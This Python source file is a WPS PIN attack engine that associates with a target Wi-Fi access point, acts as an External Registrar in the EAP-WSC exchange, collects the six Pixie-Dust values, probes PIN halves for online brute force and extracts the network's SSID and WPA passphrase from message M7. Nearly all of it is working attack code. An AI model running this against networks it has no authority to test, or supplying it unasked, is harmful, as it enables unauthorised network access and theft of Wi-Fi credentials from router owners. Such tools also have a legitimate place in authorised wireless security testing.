#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Native WPS External Registrar engine — pure Python, stdlib only.

Replaces the parts of wpa_supplicant OneShot drives for a WPS PIN attack:
associate with the AP in MANAGED mode (nl80211, no monitor mode) and run the
EAPOL / EAP-WSC exchange acting as the WPS External Registrar (so the AP is
the Enrollee, which is what Pixie-Dust needs).

Layers:
  * WSC TLV codec + EAP/EAPOL framing (byte-compatible with hostap)
  * WpsRegistrar — the message state machine (M1 in, M2 out, M3 in ...)
  * Eapol transport over AF_PACKET (ETH_P_PAE 0x888E)
  * nl80211 CONNECT association (managed mode)

Phase 1 implements the exchange through M3 and collects the six Pixie-Dust
inputs (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2). Phase 2 extends the
state machine through M7 to recover the AP's PSK (see wps_connect_full).

The protocol/crypto/message layers are unit-tested in-process against a mirror
enrollee. The live nl80211 + AF_PACKET transport REQUIRES a rooted device with
a real Wi-Fi adapter and is NOT exercised by the test suite.
"""
import os
import socket
import struct

import wps_crypto as wc
from wps_crypto import (NONCE_LEN, derive_keys, authenticator)

# ---- WSC attribute IDs (wps_defs.h) ----
ATTR_AUTH_TYPE_FLAGS = 0x1004
ATTR_AUTHENTICATOR = 0x1005
ATTR_CONFIG_METHODS = 0x1008
ATTR_CONFIG_ERROR = 0x1009
ATTR_CONN_TYPE_FLAGS = 0x100d
ATTR_ENCR_TYPE_FLAGS = 0x1010
ATTR_DEV_NAME = 0x1011
ATTR_DEV_PASSWORD_ID = 0x1012
ATTR_E_HASH1 = 0x1014
ATTR_E_HASH2 = 0x1015
ATTR_E_SNONCE1 = 0x1016
ATTR_E_SNONCE2 = 0x1017
ATTR_ENCR_SETTINGS = 0x1018
ATTR_SSID = 0x1045
ATTR_ENROLLEE_NONCE = 0x101a
ATTR_KEY_WRAP_AUTH = 0x101e
ATTR_MAC_ADDR = 0x1020
ATTR_MANUFACTURER = 0x1021
ATTR_MSG_TYPE = 0x1022
ATTR_MODEL_NAME = 0x1023
ATTR_MODEL_NUMBER = 0x1024
ATTR_NETWORK_KEY = 0x1027
ATTR_PUBLIC_KEY = 0x1032
ATTR_REGISTRAR_NONCE = 0x1039
ATTR_RF_BANDS = 0x103c
ATTR_R_HASH1 = 0x103d
ATTR_R_HASH2 = 0x103e
ATTR_R_SNONCE1 = 0x103f
ATTR_R_SNONCE2 = 0x1040
ATTR_SERIAL_NUMBER = 0x1042
ATTR_UUID_R = 0x1048
ATTR_VENDOR_EXT = 0x1049
ATTR_VERSION = 0x104a
ATTR_PRIMARY_DEV_TYPE = 0x1054
ATTR_ASSOC_STATE = 0x1002
ATTR_OS_VERSION = 0x102d

# ---- WPS message types ----
WPS_M1, WPS_M2, WPS_M3, WPS_M4 = 0x04, 0x05, 0x07, 0x08
WPS_M5, WPS_M6, WPS_M7, WPS_M8 = 0x09, 0x0a, 0x0b, 0x0c
WPS_WSC_ACK, WPS_WSC_NACK, WPS_WSC_DONE = 0x0d, 0x0e, 0x0f

# ---- EAP / EAPOL ----
EAPOL_VERSION = 2
EAPOL_TYPE_EAP = 0
EAPOL_TYPE_START = 1
EAP_CODE_REQUEST = 1
EAP_CODE_RESPONSE = 2
EAP_CODE_FAIL = 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254
EAP_VENDOR_WFA = b'\x00\x37\x2a'
EAP_VENDOR_TYPE_WSC = 1
WSC_FLAGS_MF = 0x01
WSC_FLAGS_LF = 0x02
WSC_Start, WSC_ACK, WSC_NACK, WSC_MSG, WSC_Done, WSC_FRAG_ACK = (
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06)
ETH_P_PAE = 0x888E
REGISTRAR_IDENTITY = b'WFA-SimpleConfig-Registrar-1-0'
WFA_VENDOR_EXT = b'\x00\x37\x2a'   # WFA OUI inside WSC Vendor Extension
WPS_VERSION = 0x10
WPS_VERSION2 = 0x20


class WpsProtocolError(Exception):
    pass


# --------------------------------------------------------------------------
# WSC TLV codec
# --------------------------------------------------------------------------
def attr(attr_type, value):
    return struct.pack('>HH', attr_type, len(value)) + value


def attr_u8(attr_type, v):
    return attr(attr_type, struct.pack('B', v))


def attr_be16(attr_type, v):
    return attr(attr_type, struct.pack('>H', v))


def attr_be32(attr_type, v):
    return attr(attr_type, struct.pack('>I', v))


def parse_attrs(buf):
    """Parse WSC TLVs into a list of (type, value) preserving order/duplicates."""
    out = []
    i = 0
    while i + 4 <= len(buf):
        atype, alen = struct.unpack_from('>HH', buf, i)
        i += 4
        if i + alen > len(buf):
            break
        out.append((atype, buf[i:i + alen]))
        i += alen
    return out


def attrs_dict(buf):
    """First occurrence of each attribute as {type: value}."""
    d = {}
    for t, v in parse_attrs(buf):
        d.setdefault(t, v)
    return d


def _version_attrs():
    # Version (deprecated 0x10) + WFA Vendor Extension carrying Version2 (0x20).
    v2 = WFA_VENDOR_EXT + bytes([0x00, 0x01, WPS_VERSION2])   # subelem VERSION2
    return attr_u8(ATTR_VERSION, WPS_VERSION) + attr(ATTR_VENDOR_EXT, v2)


def build_encrypted_settings(keywrapkey, authkey, inner_attrs):
    """Wrap WSC attributes as ATTR_ENCR_SETTINGS value (IV || AES-128-CBC)."""
    kwa_attr = attr(ATTR_KEY_WRAP_AUTH, wc.kwa(authkey, inner_attrs))
    plaintext = inner_attrs + kwa_attr
    pad = 16 - (len(plaintext) % 16)               # PKCS#7
    plaintext += bytes([pad]) * pad
    iv = os.urandom(16)
    return iv + wc.aes128_cbc_encrypt(keywrapkey, iv, plaintext)


def parse_encrypted_settings(keywrapkey, authkey, blob):
    """Decrypt ATTR_ENCR_SETTINGS, verify the KWA, return {attr: value}."""
    if len(blob) < 32 or len(blob) % 16:
        raise WpsProtocolError('bad Encrypted Settings length')
    iv, ct = blob[:16], blob[16:]
    plaintext = wc.aes128_cbc_decrypt(keywrapkey, iv, ct)
    pad = plaintext[-1]
    if pad < 1 or pad > 16 or pad > len(plaintext):
        raise WpsProtocolError('bad padding (wrong key/PIN?)')
    plaintext = plaintext[:-pad]
    marker = struct.pack('>HH', ATTR_KEY_WRAP_AUTH, 8)
    pos = plaintext.rfind(marker)
    if pos < 0:
        raise WpsProtocolError('missing Key Wrap Authenticator')
    inner = plaintext[:pos]
    got = plaintext[pos + 4:pos + 12]
    if wc.kwa(authkey, inner) != got:
        raise WpsProtocolError('Key Wrap Authenticator mismatch (wrong PIN/key)')
    return attrs_dict(inner)


# --------------------------------------------------------------------------
# EAP / EAPOL framing
# --------------------------------------------------------------------------
def eapol_frame(eapol_type, payload=b''):
    return struct.pack('>BBH', EAPOL_VERSION, eapol_type, len(payload)) + payload


def eapol_start():
    return eapol_frame(EAPOL_TYPE_START)


def eap_packet(code, ident, type_and_data):
    length = 4 + len(type_and_data)
    return struct.pack('>BBH', code, ident, length) + type_and_data


def eap_identity_response(ident, identity):
    return eapol_frame(EAPOL_TYPE_EAP,
                       eap_packet(EAP_CODE_RESPONSE, ident,
                                  bytes([EAP_TYPE_IDENTITY]) + identity))


def eap_wsc_response(ident, op_code, message, flags=0):
    hdr = bytes([EAP_TYPE_EXPANDED]) + EAP_VENDOR_WFA + struct.pack('>I', EAP_VENDOR_TYPE_WSC)
    body = bytes([op_code, flags]) + message
    return eapol_frame(EAPOL_TYPE_EAP, eap_packet(EAP_CODE_RESPONSE, ident, hdr + body))


def parse_eapol(frame):
    """Return (eapol_type, payload) or raise on a short/garbage frame."""
    if len(frame) < 4:
        raise WpsProtocolError('short EAPOL frame')
    ver, etype, elen = struct.unpack_from('>BBH', frame, 0)
    return etype, frame[4:4 + elen]


def parse_eap(payload):
    """Return dict describing an EAP packet (identity request or WSC)."""
    if len(payload) < 4:
        raise WpsProtocolError('short EAP packet')
    code, ident, length = struct.unpack_from('>BBH', payload, 0)
    body = payload[4:length] if length <= len(payload) else payload[4:]
    info = {'code': code, 'id': ident}
    if not body:
        info['type'] = None
        return info
    etype = body[0]
    info['type'] = etype
    if etype == EAP_TYPE_IDENTITY:
        info['identity'] = body[1:]
    elif etype == EAP_TYPE_EXPANDED:
        # vendor(3) + vendor_type(4) + op_code(1) + flags(1) + message
        if len(body) >= 1 + 3 + 4 + 2:
            info['vendor'] = body[1:4]
            info['vendor_type'] = struct.unpack_from('>I', body, 4)[0]
            info['op_code'] = body[8]
            info['flags'] = body[9]
            msg = body[10:]
            if info['flags'] & WSC_FLAGS_LF:
                # 2-byte total length prefix on first fragment
                msg = msg[2:]
            info['message'] = msg
    return info


# --------------------------------------------------------------------------
# WPS Registrar message state machine
# --------------------------------------------------------------------------
class WpsRegistrar:
    """Builds/parses WSC messages as the External Registrar (AP = Enrollee)."""

    def __init__(self, registrar_mac, pin=None,
                 device_name=b'OneShot', manufacturer=b'OneShot',
                 model_name=b'OneShot', model_number=b'1', serial=b'12345678'):
        self.registrar_mac = registrar_mac          # 6 bytes
        self.pin = pin
        self.device_name = device_name
        self.manufacturer = manufacturer
        self.model_name = model_name
        self.model_number = model_number
        self.serial = serial

        self.dh_priv, self.pkr = wc.dh_keypair()     # our (registrar) DH keys
        self.nonce_r = os.urandom(NONCE_LEN)
        self.uuid_r = os.urandom(16)
        self.rs1 = os.urandom(NONCE_LEN)             # registrar secret nonces
        self.rs2 = os.urandom(NONCE_LEN)

        # filled from M1
        self.pke = None
        self.nonce_e = None
        self.enrollee_mac = None
        self.ap_serial = None   # AP's WPS Serial Number attribute (often a placeholder)
        self.authkey = self.keywrapkey = self.emsk = None
        self.psk1 = self.psk2 = None
        # filled from M3
        self.e_hash1 = self.e_hash2 = None
        # filled from M7 (full PIN path)
        self.network_key = None
        self.found_ssid = None
        self.reached_m5 = False
        self.first_half_ok = False
        self.finished = False
        # last message we sent / received (for the running Authenticator)
        self._last_recv = None
        self._last_sent = None

    # -- M1 (received from the AP/enrollee) --
    def process_m1(self, msg):
        a = attrs_dict(msg)
        if a.get(ATTR_MSG_TYPE) != bytes([WPS_M1]):
            raise WpsProtocolError('expected M1')
        self.pke = a[ATTR_PUBLIC_KEY]
        self.nonce_e = a[ATTR_ENROLLEE_NONCE]
        self.enrollee_mac = a[ATTR_MAC_ADDR]
        self.ap_serial = (a.get(ATTR_SERIAL_NUMBER) or b'').decode('utf-8', 'replace') or None
        self.authkey, self.keywrapkey, self.emsk = derive_keys(
            self.pke, self.dh_priv, self.nonce_e, self.enrollee_mac, self.nonce_r)
        if self.pin is not None:
            self.psk1, self.psk2 = wc.derive_psk(self.authkey, str(self.pin))
        self._last_recv = msg

    # -- M2 (sent to the AP/enrollee) --
    def build_m2(self):
        body = (_version_attrs()
                + attr_u8(ATTR_MSG_TYPE, WPS_M2)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_REGISTRAR_NONCE, self.nonce_r)
                + attr(ATTR_UUID_R, self.uuid_r)
                + attr(ATTR_PUBLIC_KEY, self.pkr)
                + attr_be16(ATTR_AUTH_TYPE_FLAGS, 0x003F)
                + attr_be16(ATTR_ENCR_TYPE_FLAGS, 0x000F)
                + attr_u8(ATTR_CONN_TYPE_FLAGS, 0x01)
                + attr_be16(ATTR_CONFIG_METHODS, 0x018C)
                + attr(ATTR_MANUFACTURER, self.manufacturer)
                + attr(ATTR_MODEL_NAME, self.model_name)
                + attr(ATTR_MODEL_NUMBER, self.model_number)
                + attr(ATTR_SERIAL_NUMBER, self.serial)
                + attr(ATTR_PRIMARY_DEV_TYPE, b'\x00\x01\x00\x50\xf2\x04\x00\x01')
                + attr(ATTR_DEV_NAME, self.device_name)
                + attr_u8(ATTR_RF_BANDS, 0x01)
                + attr_be16(ATTR_ASSOC_STATE, 0x0000)
                + attr_be16(ATTR_CONFIG_ERROR, 0x0000)
                + attr_be16(ATTR_DEV_PASSWORD_ID, 0x0000)
                + attr_be32(ATTR_OS_VERSION, 0x80000000))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M3 (received from the AP/enrollee) --
    def process_m3(self, msg):
        a = attrs_dict(msg)
        if a.get(ATTR_MSG_TYPE) != bytes([WPS_M3]):
            raise WpsProtocolError('expected M3')
        self.e_hash1 = a[ATTR_E_HASH1]
        self.e_hash2 = a[ATTR_E_HASH2]
        self._last_recv = msg

    # -- M4 (sent): R-Hash1/2 + Encrypted Settings{R-S1} (full PIN path) --
    def build_m4(self):
        if self.psk1 is None:
            raise WpsProtocolError('M4 requires a PIN')
        r_hash1 = wc.wps_hash(self.authkey, self.rs1, self.psk1, self.pke, self.pkr)
        r_hash2 = wc.wps_hash(self.authkey, self.rs2, self.psk2, self.pke, self.pkr)
        encr = build_encrypted_settings(self.keywrapkey, self.authkey,
                                        attr(ATTR_R_SNONCE1, self.rs1))
        body = (_version_attrs() + attr_u8(ATTR_MSG_TYPE, WPS_M4)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_R_HASH1, r_hash1) + attr(ATTR_R_HASH2, r_hash2)
                + attr(ATTR_ENCR_SETTINGS, encr))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M5 (received): Encrypted Settings{E-S1}; confirms first PIN half --
    def process_m5(self, msg):
        a = attrs_dict(msg)
        settings = parse_encrypted_settings(self.keywrapkey, self.authkey,
                                            a[ATTR_ENCR_SETTINGS])
        es1 = settings[ATTR_E_SNONCE1]
        expect = wc.wps_hash(self.authkey, es1, self.psk1, self.pke, self.pkr)
        self.first_half_ok = (expect == self.e_hash1)
        if not self.first_half_ok:
            raise WpsProtocolError('first half of PIN is incorrect')
        self._last_recv = msg

    # -- M6 (sent): Encrypted Settings{R-S2} --
    def build_m6(self):
        encr = build_encrypted_settings(self.keywrapkey, self.authkey,
                                        attr(ATTR_R_SNONCE2, self.rs2))
        body = (_version_attrs() + attr_u8(ATTR_MSG_TYPE, WPS_M6)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_ENCR_SETTINGS, encr))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M7 (received): the AP's Encrypted Settings carrying its credential --
    def process_m7(self, msg):
        a = attrs_dict(msg)
        settings = parse_encrypted_settings(self.keywrapkey, self.authkey,
                                            a[ATTR_ENCR_SETTINGS])
        if ATTR_NETWORK_KEY in settings:
            self.network_key = settings[ATTR_NETWORK_KEY].decode('utf-8', 'replace')
        if ATTR_SSID in settings:
            self.found_ssid = settings[ATTR_SSID].decode('utf-8', 'replace')
        self.finished = True
        self._last_recv = msg

    def credential(self):
        """The recovered AP credential, or None (full PIN path)."""
        if self.network_key is None:
            return None
        return {'ssid': self.found_ssid, 'psk': self.network_key}

    def pixie_data(self):
        """The six values pixiewps needs, as uppercase hex (or None)."""
        if not all((self.pke, self.pkr, self.e_hash1, self.e_hash2,
                    self.authkey, self.nonce_e)):
            return None
        h = (lambda b: b.hex().upper())
        return {
            'pke': h(self.pke), 'pkr': h(self.pkr),
            'e_hash1': h(self.e_hash1), 'e_hash2': h(self.e_hash2),
            'authkey': h(self.authkey), 'e_nonce': h(self.nonce_e),
        }


# --------------------------------------------------------------------------
# EAPOL transport over AF_PACKET (live path — needs root + real adapter)
# --------------------------------------------------------------------------
class EapolSocket:
    """Send/receive EAPOL (EtherType 0x888E) frames on an interface."""

    def __init__(self, interface, peer_mac, timeout=5):
        self.interface = interface
        self.peer_mac = peer_mac
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(ETH_P_PAE))
        self.sock.bind((interface, ETH_P_PAE))
        self.sock.settimeout(timeout)

    def send(self, frame):
        self.sock.sendto(frame, (self.interface, ETH_P_PAE, 0, 0, self.peer_mac))

    def recv(self):
        data, _ = self.sock.recvfrom(2048)
        return data

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# --------------------------------------------------------------------------
# nl80211 association (managed mode, no monitor) — live path
# --------------------------------------------------------------------------
NL80211_CMD_CONNECT = 46
NL80211_CMD_DISCONNECT = 48
NL80211_ATTR_IFINDEX = 3
NL80211_ATTR_MAC = 6
NL80211_ATTR_SSID = 52
NL80211_ATTR_AUTH_TYPE = 53
NL80211_ATTR_IE = 42
NL80211_ATTR_WIPHY_FREQ = 38
NL80211_ATTR_STATUS_CODE = 48
NL80211_ATTR_SOCKET_OWNER = 204
NL80211_AUTHTYPE_OPEN_SYSTEM = 0
ATTR_REQUEST_TYPE = 0x103a
WPS_REQ_TYPE_REGISTRAR = 0x02


def wsc_assoc_ie():
    """WSC IE for the (re)association request advertising an External Registrar."""
    body = (b'\x00\x50\xf2\x04'                            # WPS OUI 00:50:F2 + type 0x04
            + attr_u8(ATTR_VERSION, WPS_VERSION)
            + attr_u8(ATTR_REQUEST_TYPE, WPS_REQ_TYPE_REGISTRAR))
    return bytes([0xDD, len(body)]) + body                 # element id 221 (vendor)


def _lookup_freq(interface, bssid):
    """Find the AP's frequency from a scan (also warms the kernel scan cache)."""
    import nl80211_scan as nl
    try:
        for net in nl.scan(interface):
            if net.get('BSSID') == bssid and net.get('Frequency'):
                return net['Frequency']
    except Exception:
        pass
    return 0


def associate(interface, bssid_bytes, ssid_bytes, freq=0):
    """Associate in MANAGED mode via nl80211 NL80211_CMD_CONNECT (no monitor mode).

    Returns an open netlink socket that OWNS the connection (SOCKET_OWNER) — keep
    it open for the duration of the WPS exchange; closing it tears the link down.
    Raises Nl80211Error on failure. LIVE PATH — needs root + a real adapter.
    """
    import nl80211_scan as nl
    ifindex = socket.if_nametoindex(interface)
    bssid_str = ':'.join('%02X' % b for b in bssid_bytes)
    if not freq:
        freq = _lookup_freq(interface, bssid_str)   # also populates the scan cache
    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, nl.NETLINK_GENERIC)
    sock.bind((0, 0))
    sock.settimeout(8)
    try:
        family_id, _ = nl._resolve_family(sock, 'nl80211')
        attrs = (nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', ifindex))
                 + nl._attr(NL80211_ATTR_MAC, bssid_bytes)
                 + nl._attr(NL80211_ATTR_SSID, ssid_bytes)
                 + nl._attr(NL80211_ATTR_AUTH_TYPE, struct.pack('=I', NL80211_AUTHTYPE_OPEN_SYSTEM))
                 + nl._attr(NL80211_ATTR_IE, wsc_assoc_ie())
                 + nl._attr(NL80211_ATTR_SOCKET_OWNER, b''))
        if freq:
            attrs += nl._attr(NL80211_ATTR_WIPHY_FREQ, struct.pack('=I', freq))
        nl._send(sock, nl._genl_msg(family_id, NL80211_CMD_CONNECT, 10,
                                    nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
        for _ in nl._read_until_done(sock):   # consume the synchronous CONNECT ACK
            pass
        # CONNECT is asynchronous: wait for the result event and check its status.
        _await_connect_result(sock, family_id)
        return sock
    except Exception:
        sock.close()
        raise


def _await_connect_result(sock, family_id):
    """Block for the NL80211_CMD_CONNECT result event; raise if status != 0."""
    import nl80211_scan as nl
    while True:
        try:
            data = sock.recv(65536)
        except socket.timeout:
            raise nl.Nl80211Error('association timed out (no CONNECT result event)')
        i = 0
        while i + 16 <= len(data):
            mlen, mtype = struct.unpack_from('=IH', data, i)[:2]
            if mlen < 16:
                break
            payload = data[i + 16:i + mlen]
            if mtype == family_id and payload and payload[0] == NL80211_CMD_CONNECT:
                cattrs = nl._parse_attrs(payload[4:])
                sc = cattrs.get(NL80211_ATTR_STATUS_CODE)
                status = struct.unpack('=H', sc[:2])[0] if sc and len(sc) >= 2 else 0
                if status != 0:
                    raise nl.Nl80211Error('association rejected (status {})'.format(status))
                return
            i += _align_msg(mlen)


def _align_msg(n):
    return (n + 3) & ~3


def _mac_bytes(bssid):
    return bytes(int(b, 16) for b in bssid.split(':'))


class WpsConnection:
    """High-level driver: associate + run the EAP-WSC registrar exchange.

    LIVE PATH. Requires root, a real Wi-Fi adapter, and that no other supplicant
    (NetworkManager / system wpa_supplicant) owns the interface.
    """

    def __init__(self, interface, bssid, ssid='', timeout=8):
        self.interface = interface
        self.bssid = bssid.upper()
        self.ssid = ssid or ''
        self.timeout = timeout

    def _own_mac(self):
        with open('/sys/class/net/{}/address'.format(self.interface)) as f:
            return _mac_bytes(f.read().strip())

    @staticmethod
    def _recv_eap(eapol):
        """Receive one logical EAP packet, reassembling EAP-WSC MF fragments.

        Acks each non-final fragment with WSC_FRAG_ACK. Returns a parse_eap()
        dict whose 'message' is the fully reassembled WSC message, or None on
        timeout.
        """
        try:
            while True:
                etype, payload = parse_eapol(eapol.recv())
                if etype != EAPOL_TYPE_EAP:
                    continue
                info = parse_eap(payload)
                if info.get('type') != EAP_TYPE_EXPANDED or not (info.get('flags', 0) & WSC_FLAGS_MF):
                    return info
                # Fragmented message: accumulate until a fragment clears MF.
                parts = [info.get('message', b'')]
                ident, op_code = info['id'], info['op_code']
                while True:
                    eapol.send(eap_wsc_response(ident, WSC_FRAG_ACK, b''))
                    etype, payload = parse_eapol(eapol.recv())
                    if etype != EAPOL_TYPE_EAP:
                        continue
                    frag = parse_eap(payload)
                    if frag.get('type') != EAP_TYPE_EXPANDED or frag.get('op_code') != op_code:
                        continue
                    parts.append(frag.get('message', b''))
                    ident = frag['id']
                    if not (frag.get('flags', 0) & WSC_FLAGS_MF):
                        info['message'] = b''.join(parts)
                        info['id'] = ident
                        return info
        except socket.timeout:
            return None

    def _drive(self, reg, stop):
        """Associate, then pump the EAP-WSC exchange. Returns the WpsRegistrar.

        @stop — 'm3' (Pixie-Dust data), 'm5' (first-half check), or 'm7' (full).
        """
        conn = associate(self.interface, _mac_bytes(self.bssid), self.ssid.encode())
        eapol = EapolSocket(self.interface, _mac_bytes(self.bssid), self.timeout)
        try:
            eapol.send(eapol_start())
            while True:
                info = self._recv_eap(eapol)
                if info is None:
                    break
                if info['code'] == EAP_CODE_FAIL:
                    break
                if info.get('type') == EAP_TYPE_IDENTITY and info['code'] == EAP_CODE_REQUEST:
                    eapol.send(eap_identity_response(info['id'], REGISTRAR_IDENTITY))
                    continue
                if info.get('type') != EAP_TYPE_EXPANDED:
                    continue
                msg = info.get('message', b'')
                mtype = attrs_dict(msg).get(ATTR_MSG_TYPE)
                if mtype == bytes([WPS_M1]):
                    reg.process_m1(msg)
                    if stop == 'm1':   # just wanted the device attributes (serial)
                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                        break
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m2()))
                elif mtype == bytes([WPS_M3]):
                    reg.process_m3(msg)
                    if stop == 'm3':
                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                        break
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m4()))
                elif mtype == bytes([WPS_M5]):
                    # The AP only reaches M5 if our M4 R-Hash1 matched, i.e. the
                    # first PIN half is correct.
                    reg.reached_m5 = True
                    if stop == 'm5':
                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                        break
                    reg.process_m5(msg)
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m6()))
                elif mtype == bytes([WPS_M7]):
                    reg.process_m7(msg)
                    # Learn-only registrar: NACK to abort cleanly (do not send
                    # WSC_Done, which is the enrollee's op-code).
                    eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                    break
            return reg
        finally:
            eapol.close()
            conn.close()   # SOCKET_OWNER -> closing tears down the association

    def pixie_dust(self):
        """Run M1..M3 and return the six pixiewps inputs (hex) or None."""
        reg = WpsRegistrar(self._own_mac())
        self._drive(reg, stop='m3')
        return reg.pixie_data()

    def run(self, pin):
        """Full PIN path: run M1..M7 and return the recovered AP credential or None."""
        reg = WpsRegistrar(self._own_mac(), pin=str(pin))
        self._drive(reg, stop='m7')
        return reg.credential()

    def first_half_ok(self, pin):
        """Online-bruteforce probe: True if the AP accepts the first PIN half (reaches M5)."""
        reg = WpsRegistrar(self._own_mac(), pin=str(pin))
        self._drive(reg, stop='m5')
        return reg.reached_m5

    def probe_serial(self):
        """Associate, read M1, and return the AP's WPS Serial Number (or None).

        Note: this is the serial the AP advertises in WPS, which is frequently a
        placeholder rather than the real device serial.
        """
        reg = WpsRegistrar(self._own_mac())
        self._drive(reg, stop='m1')
        return reg.ap_serial
